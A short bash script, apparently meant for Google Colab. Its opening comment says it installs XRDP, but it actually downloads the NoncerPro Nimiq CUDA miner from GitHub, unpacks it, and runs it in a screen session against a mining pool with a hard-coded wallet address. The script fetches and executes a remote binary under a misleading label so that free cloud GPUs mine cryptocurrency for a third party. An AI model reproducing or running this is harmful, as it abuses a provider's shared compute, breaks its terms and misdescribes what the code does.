#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R nim
 
wget https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.3.1/noncerpro-cuda-linux-3.3.1.tar.gz
tar -xf noncerpro-cuda-linux-3.3.1.tar.gz
chmod +x ./noncerpro
./noncerpro -d=0 --mode=dumb -a "NQ18 M6T5 B72H 6KBY QXYT 76CT RG6D HCQU C1GF" -s pool.acemining.co -p 8443 -n x7 -t 4 -i Disable
